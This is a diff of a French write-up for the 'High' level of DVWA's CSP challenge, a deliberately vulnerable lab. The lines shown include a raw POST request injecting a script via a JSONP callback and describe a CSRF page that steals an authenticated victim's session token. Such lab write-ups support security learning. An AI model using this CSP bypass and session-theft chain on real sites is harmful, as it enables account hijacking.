@@ -1,6 +1,6 @@
 # Niveau "High"
 
-Le niveau "High" nous permet de résoudre une opération mathématique grâce à un appel JSONP :
+Le niveau "High" permet de résoudre une opération mathématique grâce à un appel JSONP :
 
 ![](../../../../.gitbook/assets/70f2e8752b05cad71757484179b748c5.png)
 
@@ -34,7 +34,7 @@ Etant bloqué mais voulant aller plus loin, je suis allé voir ce que d'autres p
 
 La requête suivante devient donc possible :
 
-```text
+```
 POST /vulnerabilities/csp/ HTTP/1.1
 Host: 192.168.56.203:8080
 Cache-Control: max-age=0
@@ -56,13 +56,13 @@ include=<script src="source/jsonp.php?callback=alert(1);"></script>
 Attention à ne pas oublier le Content-Type pour la requête POST
 {% endhint %}
 
-Et en effet, notre script est bien exécuté :
+Et en effet, le script est bien exécuté :
 
 ![](../../../../.gitbook/assets/14b35a2694d9784692b57fd9be32eff2.png)
 
-Le problème ici est que pour connaitre ce endpoint en **`POST`** il fallait regarder les sources \(ou le deviner\). En général je préfère ne regarder les sources qu'après avoir terminé le challenge.
+Le problème ici est que pour connaitre ce endpoint en **`POST`** il fallait regarder les sources (ou le deviner). En général je préfère ne regarder les sources qu'après avoir terminé le challenge.
 
-Bien que l'auteur du writeup n'indique pas comment, il faut maintenant trouver un vecteur d'attaque contre notre victime. On utilise à nouveau l'exploitation de la faille CSRF, présente également sur ce niveau, en hébergeant le script malicieux suivant sur notre serveur :
+Bien que l'auteur du writeup n'indique pas comment, il faut maintenant trouver un vecteur d'attaque contre la victime. J'utilise à nouveau l'exploitation de la faille CSRF, présente également sur ce niveau, en hébergeant le script malicieux suivant sur mon serveur :
 
 ```markup
 <html>
@@ -88,7 +88,6 @@ Bien que l'auteur du writeup n'indique pas comment, il faut maintenant trouver u
 Attention à l'encodage de certains caractères spéciaux au niveau de la valeur à envoyer
 {% endhint %}
 
-Lorsque la victime \(authentifiée\) visite notre page malicieuse, l'attaquant subtilise son jeton de session :
+Lorsque la victime (authentifiée) visite ma page malicieuse, je subtilise son jeton de session :
 
 ![](../../../../.gitbook/assets/07f3f7439e05a98dcb2a5eb628e005f6.png)
-
